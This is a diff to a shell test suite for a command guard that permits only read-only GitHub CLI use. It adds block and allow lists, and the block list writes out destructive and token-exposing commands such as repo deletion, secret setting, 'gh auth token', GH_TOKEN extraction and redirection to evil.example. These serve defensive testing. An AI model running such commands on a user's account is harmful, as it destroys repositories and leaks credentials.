@@ -946,6 +946,8 @@ BLOCK+=(
   "$SG --json . | grep check_id | jq '$SGJQ'"
   "$SG --json . | jq -S '$SGJQ'"
   "$SG --json . | jq '$SGJQ' x.json"
+  # one documented filter only: @tsv drops the error count
+  "$SG --json . | jq -r '.results[] | [.check_id,.path,.start.line] | @tsv'"
 )
 
 ALLOW+=(
@@ -967,6 +969,96 @@ ALLOW+=(
   'gh api repos/OWNER/REPO/rules/branches/BRANCH'
 )
 
+# gh runs on the user's full GitHub token: GET-only api on repos/ or user, and listed read subcommands.
+BLOCK+=(
+  'gh repo delete x/y --yes'
+  'gh secret set X --body y'
+  'gh secret set X -R o/r'
+  'gh api -X DELETE repos/o/r'
+  'gh api -XDELETE repos/o/r'
+  'gh api -X=DELETE repos/o/r'
+  'gh api repos/o/r -X'
+  "gh api repos/o/r -X ''"
+  'gh pr view 1 --jq env.GH_TOKEN'
+  'gh api --method PUT repos/o/r/branches/main/protection'
+  'gh api --method=PATCH repos/o/r'
+  'gh api -X POST repos/o/r/issues'
+  'gh api repos/o/r/issues -f title=x'
+  'gh api repos/o/r/issues -F title=x'
+  'gh api repos/o/r/issues --field title=x'
+  'gh api repos/o/r/issues --raw-field title=x'
+  'gh api repos/o/r/issues --input body.json'
+  'gh api repos/o/r -H "Accept: x"'
+  'gh api repos/o/r --header "Accept: x"'
+  'gh api repos/o/r --hostname evil.example'
+  'gh api graphql -f query=x'
+  'gh api graphql'
+  'gh api orgs/o/members'
+  'gh api user/keys'
+  'gh api /user/emails'
+  'gh api repos/o/r/../../graphql'
+  'gh api repos/o/r/actions/runs/1/logs'
+  'gh api repos/o/r --verbose'
+  'gh api repos/o/r --template x'
+  'gh api repos/o/r repos/o/s'
+  'gh api'
+  'gh api repos/o/r --jq env.GH_TOKEN'
+  'gh workflow run deploy.yml'
+  'gh workflow enable x'
+  'gh run rerun 1'
+  'gh run cancel 1'
+  'gh run view 1 --log'
+  'gh run view 1 --log-failed'
+  'gh pr merge 1 --admin'
+  'gh pr checkout 1'
+  'gh pr view 1 --web'
+  'gh auth token'
+  'gh auth status --show-token'
+  'gh auth status -t'
+  'gh auth login'
+  'gh extension install x/y'
+  'gh ext list'
+  'gh alias set x y'
+  'gh config get oauth_token'
+  'gh release create v1'
+  'gh repo clone o/r'
+  'gh --repo o/r api repos/o/r'
+  'GH_TOKEN=x gh api user'
+  'GH_HOST=evil.example gh api user'
+  'GH_ENTERPRISE_TOKEN=x gh api user'
+  '/usr/bin/gh repo delete x/y --yes'
+  '/usr/bin/gh api user'
+  './gh api user'
+  'GH api user'
+  'gh api user | gh api -X POST repos/o/r/issues'
+  'gh api user && gh repo delete x/y --yes'
+)
+ALLOW+=(
+  'gh api user'
+  'gh api repos/OWNER/REPO --jq .visibility'
+  'gh api repos/o/r -q .visibility'
+  'gh api repos/o/r --jq=.visibility'
+  'gh api repos/o/r -X GET'
+  'gh api repos/o/r -Xget'
+  'gh api repos/o/r -X=GET'
+  'gh api repos/o/r --method get'
+  'gh api repos/o/r --method=GET --paginate'
+  'gh api repos/o/r/actions/permissions/workflow'
+  'gh api repos/o/r/branches/main --jq .protected'
+  'gh api repos/o/r | jq .visibility'
+  'gh repo view o/r --json visibility'
+  'gh pr list -R o/r --limit 5 --json number,title'
+  'gh pr view 1 -R o/r --json title -q .title'
+  'gh run list --branch main --limit 10'
+  'gh run list -b main -L 10'
+  'gh run view 123 --repo o/r'
+  'gh workflow list'
+  'gh workflow view ci.yml'
+  'gh release list --limit 3'
+  'gh secret list'
+  'gh auth status'
+)
+
 for c in "${BLOCK[@]}"; do
   if guard_check "$c" 2>/dev/null; then fail "should block: $c"; else pass "blocks: $c"; fi
 done
@@ -983,7 +1075,7 @@ while IFS= read -r c; do
   if guard_check "$c" 2>/dev/null; then pass "documented scanner allowed: $c"; else fail "documented scanner denied: $c (${GUARD_REASON:-})"; fi
 done < <(awk '/^```scanner$/{f=1;next} /^```$/{f=0} f' skills/raystack/references/scanners.md skills/*/references/checklist.md skills/*/SKILL.md 2>/dev/null)
 if [ "$n" -ge 7 ]; then pass "scanner doc blocks found ($n)"; else fail "scanner doc blocks found ($n)"; fi
-for c in 'osv-scanner scan --no-call-analysis=go -r --format json .' 'zizmor --offline .' 'hadolint Dockerfile' "grep -rl '[g]itleaks:allow' ." "semgrep scan --config p/default --metrics off --disable-version-check --json . | jq -r '.results[] | [.check_id,.path,.start.line] | @tsv'"; do
+for c in 'osv-scanner scan --no-call-analysis=go -r --format json .' 'zizmor --offline .' 'hadolint Dockerfile' "grep -rl '[g]itleaks:allow' ."; do
   if guard_check "$c" 2>/dev/null; then pass "allows: $c"; else fail "should allow: $c (${GUARD_REASON:-})"; fi
 done
 
